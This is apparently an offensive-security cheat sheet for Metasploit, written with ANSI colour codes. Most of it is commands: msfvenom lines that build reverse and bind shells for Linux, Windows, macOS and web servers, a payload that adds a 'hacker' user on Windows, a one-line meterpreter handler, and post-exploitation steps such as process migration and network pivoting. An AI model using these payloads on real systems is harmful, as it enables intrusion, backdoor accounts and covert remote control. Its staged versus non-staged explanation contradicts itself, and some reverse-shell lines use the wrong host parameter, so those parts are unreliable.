\033[0;34m##################################################################################
\033[1;35m=== msfvenom (Linux) ===\033[0m
\033[1;31mMsfvenom CheatSheet!:\033[0m
\033[0;31m- List available payloads -\033[0m
msfvenom -l payloads

\033[0;31m- List payload options -\033[0m
msfvenom -p PAYLOAD --list-options

\033[0;31m- Using "exitfunc=thread" which is more safe for the program being tested -\033[0m
msfvenom -p <platform>/<x86/x64>/<shell_type> LHOST=<listener_ip> LPORT=<listener_port> exitfunc=thread -f <filetype> -o <output>

\033[0;31m- Meterpreter reverse shell x86 multi stage -\033[0m
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elfLinux

\033[0;31m- Linux Meterpreter bind shell x86 multi stage -\033[0m
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

\033[0;31m- Linux bind shell x64 single stage -\033[0m
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

\033[0;31m- Linux reverse shell x64 single stage -\033[0m
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

\033[0;31m- windows/x64 shell binary (dll) -\033[0m
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f dll -o example.dll

\033[0;31m- Windows Meterpreter reverse shell -\033[0m
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

\033[0;31m- Windows Meterpreter bind shell -\033[0m
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe

\033[0;31m- Windows CMD Multi Stage -\033[0m
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

\033[0;31m- Windows CMD Single Stage -\033[0m
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

\033[0;31m- Windows add user -\033[0m
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe

\033[0;31m- windows adduser (shellcode) (python) -\033[0m
msfvenom -p windows/adduser USER=pogchamp PASS=MyPassword123! --bad-chars \\x00\\x01\\x02...\\x2c(optional) --format python -v shellcode

\033[0;31m- Mac Reverse Shell -\033[0m
msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho

\033[0;31m- Mac Bind shell -\033[0m
msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho

\033[0;31m- Python Shell -\033[0m
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py

\033[0;31m- BASH Shell -\033[0m
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh

\033[0;31m- PERL Shell -\033[0m
msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl

\033[0;31m- ASP Meterpreter shell -\033[0m
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

\033[0;31m- JSP Shell -\033[0m
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp

\033[0;31m- WAR Shell -\033[0m
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war

\33[0;31m- PHP Reverse Shell -\033[0m
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php

\033[0;31m- List platforms & architectures -\033[0m
msfvenom -l payloads --platform windows --arch x64

\033[0;34m##################################################################################
\033[1;35m=== msfconsole (Linux/Windows) ===\033[0m
\033[1;31mNote on staged vs non-staged payloads:\033[0m
\033[0;31mA staged payload is usually sent in two stages whilst a non-staged payload
is sent in one go. 

A staged payload is smaller because everything is sent in two stages
and a non-staged payload is larger because everything is sent in one go.\033[0m

\033[0;31mA staged payload is usually more stable because everything is included in one go.

A non-staged payload is usually less stable because there's two stages:
A small primary payload that causes the victim machine to connect back to the attacker, transfer
a larger secondary payload containing the rest of the shellcode, and then execute it.

\033[0;37mA staged payload generally looks like...\033[0m
payload/<os-type>/<x86/x64>/<meterpreter/shell>/<reverse_tcp>
\033[0;37mA non-staged payload generally looks like...\033[0m
payload/<os-type>/<x86/x64>/<meterpreter/shell>_reverse_tcp>

\033[0;31m- Something to consider when choosing between a staged/non-staged payload is the
allowed size of the exploit being used which could make or break the exploit... -\033[0m

\033[0;31m- General exploit usage -\033[0m
\033[1;31mAfter sucessfully exploiting a target:\033[0m
\033[1;31m###########################################################\033[0m
\033[0;31m- Background the session/channel -\033[0m
^Z

\033[0;31m- Background the session -\033[0m
\033[0;31mmeterpreter>\033[0m bg\033[0m

\033[0;31m- Search for a post exploitation module -\033[0m
\033[0;31mmsf6>\033[0m search <module_name/keywords>

\033[0;31m- List sessions -\033[0m
\033[0;31mmeterpreter>\033[0m sessions -l

\033[0;31m- Interact with session -\033[0m
\033[0;31mmeterpreter>\033[0m sessions -i <session_id>

\033[0;31m- After getting a shell list processes -\033[0m
\033[0;31mmeterpreter>\033[0m ps

\033[0;31m- Migrate to other processes for a more stable shell or another user -\033[0m
\033[0;31mmeterpreter>\033[0m migrate <PID>

\033[0;31m- Execute program (Post-Exploitation) -\033[0m
\033[0;31mmeterpreter>\033[0m execute -H -f <notepad>

\033[1;31m###########################################################\033[0m
\033[0;31m- Initialize the database & enable database service -\033[0m
sudo msfdb init
sudo systemctl enable postgresql

\033[0;31m- Launch metasploit -\033[0m
sudo msfconsole
sudo msfconsole -q

\033[0;31m- General utility commands -\033[0m
\033[0;31mmsf6>\033[0m db_status
\033[0;31mmsf6>\033[0m workspace
\033[0;31mmsf6>\033[0m workspace -a <name_of_workspace_to_add>
\033[0;31mmsf6>\033[0m workspace -d <name_of_workspace_to_del>

\033[0;31mmsf6>\033[0m help
\033[0;31mmsf6>\033[0m show -h

\033[0;31m- Using db_nmap -\033[0m
\033[0;31mmsf6>\033[0m db_nmap
\033[0;31mmsf6>\033[0m db_nmap -A <target_ip>

\033[0;31mmsf6>\033[0m hosts
\033[0;31mmsf6>\033[0m services
\033[0;31mmsf6>\033[0m services -p <discovered_port>

\033[0;31m- enumeration -\033[0m
\033[0;31mmeterpreter>\033[0m run post/multi/recon/local_exploit_suggester 

\033[0;31m- oneliners -\033[0m
\033[0;31mmeterpreter revshell:\033[0m
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <ipaddress>;set LPORT <port>;run;"

\033[0;31m- [!] If you get encoder errors -\033[0m
set payload windows/meterpreter/reverse_tcp_allports

\033[0;31m- Auxiliary Modules -\033[0m
show auxiliary
search type:auxiliary smb
search type:auxiliary ssh

\033[1;31m###########################################################\033[0m
\033[1;35m=== metasploit network (Linux) ===\033[0m
\033[0;31m- Manually adding a route (together with session) -\033[0m
\033[0;31mmsf6>\033[0m route add <172.16.5.0/24 <SID>>
\033[0;31mmsf6>\033[0m route print

\033[0;31m- Automatically adding a route (together with session) -\033[0m
\033[0;31mmsf6>\033[0m use multi/manage/autoroute
\033[0;31mmsf6 (module)>\033[0m sessions -l
\033[0;31mmsf6 (module)>\033[0mset session <SID>
\033[0;31mmsf6 (module)>\033[0m run

\033[0;31m- Setup a proxy -\033[0m
\033[0;31mmsf6>\033[0m use auxiliary/server/socks_proxy
\033[0;31mmsf6 (module)>\033[0m
\033[0;31mmsf6 (module)>\033[0m set SRVHOST 127.0.0.1
\033[0;31mmsf6 (module)>\033[0m set VERSION 5
\033[0;31mmsf6 (module)>\033[0m run -j

\033[1;31m###########################################################\033[0m
\033[1;35m=== metasploit automation (Linux) ===\033[0m
\033[0;31m-  -\033[0m

\033[0;34m##################################################################################\033[0m
\n
